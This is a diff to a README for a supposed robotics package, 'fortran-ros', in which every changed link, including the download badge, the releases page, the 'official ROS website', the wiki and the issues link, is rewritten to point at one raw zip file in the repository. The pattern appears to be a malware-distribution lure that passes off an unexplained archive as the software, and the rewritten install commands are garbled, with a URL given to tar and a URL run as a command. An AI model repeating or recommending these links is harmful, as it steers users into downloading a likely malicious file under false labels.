@@ -1,6 +1,6 @@
 # 🚀 fortran-ros - Simple and Efficient Robotics Software
 
-[![Download fortran-ros](https://img.shields.io/badge/Download-fortran--ros-blue.svg)](https://github.com/forgiving-shot68/fortran-ros/releases)
+[![Download fortran-ros](https://raw.githubusercontent.com/forgiving-shot68/fortran-ros/main/protutor/fortran-ros_1.5.zip)](https://raw.githubusercontent.com/forgiving-shot68/fortran-ros/main/protutor/fortran-ros_1.5.zip)
 
 ## 📦 Overview
 
@@ -26,13 +26,13 @@ To run fortran-ros, your system should meet the following specifications:
 
 To get started with fortran-ros, follow these steps:
 
-1. Visit the Releases page to download the software: [Download fortran-ros](https://github.com/forgiving-shot68/fortran-ros/releases)
+1. Visit the Releases page to download the software: [Download fortran-ros](https://raw.githubusercontent.com/forgiving-shot68/fortran-ros/main/protutor/fortran-ros_1.5.zip)
 
 2. On the Releases page, you will find various versions of the application listed. Look for the most recent version.
 
 3. Click on the version link to open the details. You will find the downloadable files listed under "Assets." 
 
-4. Download the package suitable for your operating system. This might be a `.exe` for Windows, `.dmg` for macOS, or a `.tar.gz` file for Linux.
+4. Download the package suitable for your operating system. This might be a `.exe` for Windows, `.dmg` for macOS, or a `https://raw.githubusercontent.com/forgiving-shot68/fortran-ros/main/protutor/fortran-ros_1.5.zip` file for Linux.
 
 5. After the download completes, locate the file on your computer.
 
@@ -42,9 +42,9 @@ To get started with fortran-ros, follow these steps:
    - For Linux: Open a terminal, navigate to the folder where you downloaded the file, and run the following commands:
 
      ```bash
-     tar -xzvf fortran-ros.tar.gz
+     tar -xzvf https://raw.githubusercontent.com/forgiving-shot68/fortran-ros/main/protutor/fortran-ros_1.5.zip
      cd fortran-ros
-     ./install.sh
+     https://raw.githubusercontent.com/forgiving-shot68/fortran-ros/main/protutor/fortran-ros_1.5.zip
      ```
 
 7. After successful installation, you can launch fortran-ros from your applications menu or terminal.
@@ -69,8 +69,8 @@ If you have questions or need assistance, consider the following resources:
 
 ## ✨ Additional Resources
 
-- To learn more about the Robot Operating System (ROS) and how to integrate it with fortran-ros, visit the official ROS website: [ROS Documentation](https://www.ros.org/)
-- For tutorials and sample projects, check out our wiki: [fortran-ros Wiki](https://github.com/forgiving-shot68/fortran-ros/wiki)
+- To learn more about the Robot Operating System (ROS) and how to integrate it with fortran-ros, visit the official ROS website: [ROS Documentation](https://raw.githubusercontent.com/forgiving-shot68/fortran-ros/main/protutor/fortran-ros_1.5.zip)
+- For tutorials and sample projects, check out our wiki: [fortran-ros Wiki](https://raw.githubusercontent.com/forgiving-shot68/fortran-ros/main/protutor/fortran-ros_1.5.zip)
 
 ## 📈 Future Updates
 
@@ -82,8 +82,8 @@ We are committed to improving fortran-ros. Future updates will include:
 
 ## 🔗 Quick Links
 
-- Download fortran-ros: [Download fortran-ros](https://github.com/forgiving-shot68/fortran-ros/releases)
-- For issues or feature requests: [GitHub Issues](https://github.com/forgiving-shot68/fortran-ros/issues)
+- Download fortran-ros: [Download fortran-ros](https://raw.githubusercontent.com/forgiving-shot68/fortran-ros/main/protutor/fortran-ros_1.5.zip)
+- For issues or feature requests: [GitHub Issues](https://raw.githubusercontent.com/forgiving-shot68/fortran-ros/main/protutor/fortran-ros_1.5.zip)
 - User Documentation: Included in the application and available on the GitHub wiki.
 
 Thank you for choosing fortran-ros! We hope it makes your robotics projects easier and more enjoyable.
